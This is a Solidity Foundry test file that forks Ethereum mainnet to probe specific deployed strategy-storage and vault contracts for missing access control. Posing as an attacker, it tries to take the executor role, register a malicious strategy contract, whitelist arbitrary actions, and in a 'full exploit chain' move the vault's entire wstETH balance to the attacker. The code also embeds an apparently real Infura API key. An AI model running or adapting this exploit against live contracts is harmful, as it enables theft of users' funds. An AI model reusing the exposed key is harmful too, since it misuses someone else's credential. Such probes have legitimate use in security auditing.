// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IStrategyStorage {
    function strategyExecutor() external view returns (address);
    function owner() external view returns (address);
    function pendingOwner() external view returns (address);
    
    // Key functions to test
    function setStrategyExecutor(address newExecutor) external;
    function storeStrategy(address strategy, bytes4[] calldata actionIds, address[] calldata assets) external;
    function whitelistActions(uint256 strategyId, bytes4[] calldata actionIds) external;
    function whitelistAssets(uint256 strategyId, address[] calldata assets) external;
    
    // Read functions
    function getStrategyCount() external view returns (uint256);
    function getStrategyAddress(uint256 id) external view returns (address);
    function isActiveStrategy(address strategy) external view returns (bool);
    function isActionWhitelisted(address strategy, bytes4 actionId) external view returns (bool);
}

interface IStrategy {
    function callExecute(address _target, bytes memory _data) external payable returns (bytes32);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract StrategyStorageExploitTest is Test {
    address constant STRATEGY_STORAGE = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;
    address constant STRATEGY = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant STRATEGY_EXECUTOR = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    
    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_TrySetStrategyExecutor() public {
        console.log("=== TRYING TO SET STRATEGY EXECUTOR ===\n");
        
        IStrategyStorage storage_ = IStrategyStorage(STRATEGY_STORAGE);
        
        address currentExecutor = storage_.strategyExecutor();
        console.log("Current executor:", currentExecutor);
        console.log("Owner:", storage_.owner());
        
        vm.startPrank(attacker);
        
        // Try to set ourselves as executor
        try storage_.setStrategyExecutor(attacker) {
            console.log("CRITICAL: setStrategyExecutor succeeded!");
            
            address newExecutor = storage_.strategyExecutor();
            console.log("New executor:", newExecutor);
            
            if (newExecutor == attacker) {
                console.log("EXPLOIT: Attacker is now the executor!");
            }
        } catch Error(string memory reason) {
            console.log("setStrategyExecutor failed:", reason);
        } catch {
            console.log("setStrategyExecutor failed (unknown reason)");
        }
        
        vm.stopPrank();
    }

    function test_TryStoreStrategy() public {
        console.log("=== TRYING TO STORE MALICIOUS STRATEGY ===\n");
        
        IStrategyStorage storage_ = IStrategyStorage(STRATEGY_STORAGE);
        
        uint256 countBefore = storage_.getStrategyCount();
        console.log("Strategy count before:", countBefore);
        
        vm.startPrank(attacker);
        
        // Deploy a malicious strategy
        MaliciousStrategy malicious = new MaliciousStrategy();
        console.log("Malicious strategy deployed at:", address(malicious));
        
        // Try to register it
        bytes4[] memory actionIds = new bytes4[](0);
        address[] memory assets = new address[](1);
        assets[0] = wstETH;
        
        try storage_.storeStrategy(address(malicious), actionIds, assets) {
            console.log("CRITICAL: storeStrategy succeeded!");
            
            uint256 countAfter = storage_.getStrategyCount();
            console.log("Strategy count after:", countAfter);
            
            if (countAfter > countBefore) {
                console.log("EXPLOIT: Malicious strategy registered!");
            }
        } catch Error(string memory reason) {
            console.log("storeStrategy failed:", reason);
        } catch {
            console.log("storeStrategy failed (unknown reason)");
        }
        
        vm.stopPrank();
    }

    function test_TryWhitelistActions() public {
        console.log("=== TRYING TO WHITELIST MALICIOUS ACTIONS ===\n");
        
        IStrategyStorage storage_ = IStrategyStorage(STRATEGY_STORAGE);
        
        vm.startPrank(attacker);
        
        // Try to whitelist arbitrary actions on existing strategy
        bytes4[] memory actionIds = new bytes4[](1);
        actionIds[0] = bytes4(keccak256("maliciousAction()"));
        
        // Strategy 0 has id 0
        try storage_.whitelistActions(0, actionIds) {
            console.log("CRITICAL: whitelistActions succeeded!");
        } catch Error(string memory reason) {
            console.log("whitelistActions failed:", reason);
        } catch {
            console.log("whitelistActions failed (unknown reason)");
        }
        
        vm.stopPrank();
    }

    function test_CheckStrategyInfo() public view {
        console.log("=== CHECKING ALL STRATEGY INFO ===\n");
        
        IStrategyStorage storage_ = IStrategyStorage(STRATEGY_STORAGE);
        
        uint256 count = storage_.getStrategyCount();
        console.log("Total strategies:", count);
        
        for (uint256 i = 0; i < count; i++) {
            address strat = storage_.getStrategyAddress(i);
            console.log("\nStrategy", i, ":", strat);
            console.log("Is active:", storage_.isActiveStrategy(strat));
            console.log("wstETH balance:", IERC20(wstETH).balanceOf(strat));
        }
    }

    function test_FullExploitChain() public {
        console.log("=== FULL EXPLOIT CHAIN ATTEMPT ===\n");
        
        IStrategyStorage storage_ = IStrategyStorage(STRATEGY_STORAGE);
        
        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBalanceBefore / 1e18, "wstETH");
        
        vm.startPrank(attacker);
        
        // Step 1: Try to become executor
        console.log("\n--- Step 1: Try to become executor ---");
        try storage_.setStrategyExecutor(attacker) {
            console.log("SUCCESS: Became executor!");
            
            // Step 2: Now we can call executeOnStrategy
            console.log("\n--- Step 2: Execute on strategy ---");
            
            // Call the strategy directly since we're now the executor
            // Strategy checks: msg.sender == strategyStorage.strategyExecutor()
            // Now that should pass!
            
            // We need to call Strategy.callExecute which will:
            // 1. Check we are the executor (should pass now)
            // 2. Call execute() with self-call
            // 3. delegatecall to our target
            
            // Let's transfer all wstETH from vault to attacker
            bytes memory transferCall = abi.encodeWithSignature(
                "transfer(address,uint256)",
                attacker,
                vaultBalanceBefore
            );
            
            try IStrategy(STRATEGY).callExecute(wstETH, transferCall) returns (bytes32 result) {
                console.log("callExecute succeeded!");
                console.logBytes32(result);
            } catch Error(string memory reason) {
                console.log("callExecute failed:", reason);
            } catch {
                console.log("callExecute failed (unknown)");
            }
            
        } catch {
            console.log("Could not become executor - access controlled");
        }
        
        vm.stopPrank();
        
        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBalance = IERC20(wstETH).balanceOf(attacker);
        
        console.log("\n--- Results ---");
        console.log("Vault wstETH after:", vaultBalanceAfter / 1e18, "wstETH");
        console.log("Attacker wstETH:", attackerBalance / 1e18, "wstETH");
        
        if (attackerBalance > 0) {
            console.log("\n!!! EXPLOIT SUCCESSFUL !!!");
        }
    }
}

contract MaliciousStrategy {
    function execute(address target, bytes memory data) external payable returns (bytes32) {
        (bool success, bytes memory returnData) = target.call(data);
        require(success, "Call failed");
        return bytes32(returnData);
    }
    
    function callExecute(address target, bytes memory data) external payable returns (bytes32) {
        return this.execute(target, data);
    }
    
    function strategyStorage() external pure returns (address) {
        return 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;
    }
}
